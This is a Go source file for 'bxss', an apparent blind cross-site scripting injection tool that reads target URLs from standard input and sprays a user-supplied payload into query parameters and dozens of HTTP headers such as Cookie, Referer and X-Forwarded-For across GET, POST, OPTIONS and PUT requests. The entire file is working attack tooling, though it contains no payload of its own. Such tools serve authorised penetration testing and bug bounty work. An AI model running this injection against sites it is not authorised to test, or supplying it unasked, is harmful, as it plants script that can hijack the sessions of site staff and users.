package main

import (
"net/url"
"fmt"
"net/http"
"time"
"sync"
"flag"
"bufio"
"os"
)

const (
	BannerColor  = "\033[1;34m%s\033[0m\033[1;36m%s\033[0m"
	TextColor = "\033[1;0m%s\033[1;32m%s\n\033[0m"
        InfoColor    = "\033[1;0m%s\033[1;35m%s\033[0m"
        NoticeColor  = "\033[1;0m%s\033[1;34m%s\n\033[0m"
        WarningColor = "\033[1;33m%s%s\033[0m"
        ErrorColor   = "\033[1;31m%s%s\033[0m"
        DebugColor   = "\033[0;36m%s%s\033[0m"
)

func main () {
	
	// Flag variables
	var c int
	var p string
	var h string
	var a bool
	var t bool
	var s bool
	// The flag / arguments
	flag.IntVar(&c, "concurrency", 30, "Set the concurrency")
	flag.StringVar(&h, "header", "User-Agent", "Set the custom header")
	flag.StringVar(&p, "payload", "", "the blind XSS payload")
	flag.BoolVar(&a, "appendMode", false, "Append the payload to the parameter")
	flag.BoolVar(&t, "parameters", false, "Test the parameters for blind xss")
	flag.BoolVar(&s, "spray", false, "Spray and Pray")
	// Parse the arguments
	flag.Parse()


	// The banner
	fmt.Printf(BannerColor,`

	  ____               
	 |  _ \              
 	 | |_) |_  _____ ___ 
	 |  _ <\ \/ / __/ __|
	 | |_) |>  <\__ \__ \
	 |____//_/\_\___/___/
	                     
                    
	`, "-- Coded by @z0idsec -- \n")

	// Check to see if the bxss payload it set.
	if p == "" || h == "" {
		flag.PrintDefaults()
		return
	}else {

		fmt.Printf(NoticeColor, "\n[-] Please Be Patient for bxss\n ", "")
		var wg sync.WaitGroup
		for i:=0; i<c; i++ {
			wg.Add(1)
			go func () {
				testbxss(p, h, s, a, t)
				wg.Done()
			}()
			wg.Wait()
		}
	}
}

func testbxss(payload string, header string, spray bool, appendMode bool, isParameters bool) {
	time.Sleep(500 * time.Microsecond)
	scanner := bufio.NewScanner(os.Stdin)
	client:=&http.Client{ Timeout: 3*time.Second,}
	for scanner.Scan() {
		link:=scanner.Text()
		fmt.Println("")
		fmt.Printf(NoticeColor, "[+] \tHeader:  ", header)
		fmt.Printf(TextColor,"[+] \tPayload: ",payload)
		fmt.Println("")

		// Make GET Request
		makeRequest(client, "GET", payload, link, header, spray, appendMode, isParameters)
		// Make POST Request
                makeRequest(client, "POST", payload, link, header, spray, appendMode, isParameters)
		// Make OPTIONS Request
                makeRequest(client, "OPTIONS", payload, link, header, spray, appendMode, isParameters)
		// Make PUT Request
                makeRequest(client, "PUT", payload, link, header, spray, appendMode, isParameters)	
	}	
}

func makeRequest(client *http.Client, method string, payload string, link string, header string, spray bool, appendMode bool, isParameters bool) {

	fmt.Printf(NoticeColor, "\n[*] Making request with " ,method)
	fmt.Println("")

	if isParameters == true {
	
		u, err := url.Parse(link)
		if err != nil {
			return
		}
		qs := url.Values{}
       		for param, vv := range u.Query() {
        		if appendMode {
				fmt.Printf(TextColor,"[*] Parameter:  ", param)
               			qs.Set(param, vv[0]+payload)
                	} else {
				fmt.Printf(TextColor,"[*] Parameter:  ", param)
                        	qs.Set(param, payload)
                	}
        	}

		u.RawQuery = qs.Encode()
		fmt.Printf(InfoColor,"[-] Testing:  ",u.String())
		request,err := http.NewRequest(method, u.String(), nil)
       		if err != nil {
			return
        	}
        	request.Header.Set(header, payload)
        	if spray {
	        	request.Header.Set("Cookie", payload)
	            request.Header.Set("CF-Connecting-IP", payload)
	            request.Header.Set("Client-IP", payload)
	            request.Header.Set("Cluster-Client-IP", payload)
	            request.Header.Set("Contact", payload)
	            request.Header.Set("Destination", payload)
	            request.Header.Set("Forwarded", payload)
	            request.Header.Set("From", payload)
	            request.Header.Set("Origin", payload)
	            request.Header.Set("Profile", payload)
	            request.Header.Set("Proxy-Host", payload)
	            request.Header.Set("Proxy", payload)
	            request.Header.Set("Referer", payload)
	            request.Header.Set("True-Client-IP", payload)
	            request.Header.Set("UID", payload)
	            request.Header.Set("Via", payload)
	            request.Header.Set("X-Arbitrary", payload)
	            request.Header.Set("X-CSRF-Token", payload)
	            request.Header.Set("XSRF-Token", payload)
	            request.Header.Set("X-Client-IP", payload)
	            request.Header.Set("X-Cluster-Client-IP", payload)
	            request.Header.Set("X-Forwarded-For", payload)
	            request.Header.Set("X-Forwarded-Host", payload)
	            request.Header.Set("X-Forwarded-Proto", payload)
	            request.Header.Set("X-Forwarded-Server", payload)
	            request.Header.Set("X-HTTP-Destination-URL", payload)
	            request.Header.Set("X-Host", payload)
	            request.Header.Set("X-Original-URL", payload)
	            request.Header.Set("X-Originating-IP", payload)
	            request.Header.Set("X-Real-IP", payload)
	            request.Header.Set("X-Remote-Addr", payload)
	            request.Header.Set("X-Remote-IP", payload)
	            request.Header.Set("X-Wap-Profile", payload)
	            request.Header.Set("CF-IP-Country", payload)
	            request.Header.Set("CF-Visitor", payload)
	            request.Header.Set("X-ARR-LOG-ID", payload)
	            request.Header.Set("Debug", payload)
	            request.Header.Set("X-Debug-Info", payload)
        	}
        	client.Do(request)
	}else {

	        fmt.Printf(InfoColor,"[-] Testing:  ", link)
                request,err := http.NewRequest(method, link, nil)
                if err != nil {
                        return
                }
                request.Header.Set(header, payload)
                if spray {
		        	request.Header.Set("Cookie", payload)
		            request.Header.Set("CF-Connecting-IP", payload)
		            request.Header.Set("Client-IP", payload)
		            request.Header.Set("Cluster-Client-IP", payload)
		            request.Header.Set("Contact", payload)
		            request.Header.Set("Destination", payload)
		            request.Header.Set("Forwarded", payload)
		            request.Header.Set("From", payload)
		            request.Header.Set("Origin", payload)
		            request.Header.Set("Profile", payload)
		            request.Header.Set("Proxy-Host", payload)
		            request.Header.Set("Proxy", payload)
		            request.Header.Set("Referer", payload)
		            request.Header.Set("True-Client-IP", payload)
		            request.Header.Set("UID", payload)
		            request.Header.Set("Via", payload)
		            request.Header.Set("X-Arbitrary", payload)
		            request.Header.Set("X-CSRF-Token", payload)
		            request.Header.Set("XSRF-Token", payload)
		            request.Header.Set("X-Client-IP", payload)
		            request.Header.Set("X-Cluster-Client-IP", payload)
		            request.Header.Set("X-Forwarded-For", payload)
		            request.Header.Set("X-Forwarded-Host", payload)
		            request.Header.Set("X-Forwarded-Proto", payload)
		            request.Header.Set("X-Forwarded-Server", payload)
		            request.Header.Set("X-HTTP-Destination-URL", payload)
		            request.Header.Set("X-Host", payload)
		            request.Header.Set("X-Original-URL", payload)
		            request.Header.Set("X-Originating-IP", payload)
		            request.Header.Set("X-Real-IP", payload)
		            request.Header.Set("X-Remote-Addr", payload)
		            request.Header.Set("X-Remote-IP", payload)
		            request.Header.Set("X-Wap-Profile", payload)
		            request.Header.Set("CF-IP-Country", payload)
		            request.Header.Set("CF-Visitor", payload)
		            request.Header.Set("X-ARR-LOG-ID", payload)
		            request.Header.Set("Debug", payload)
		            request.Header.Set("X-Debug-Info", payload)
	        	}
                client.Do(request)

	}
}
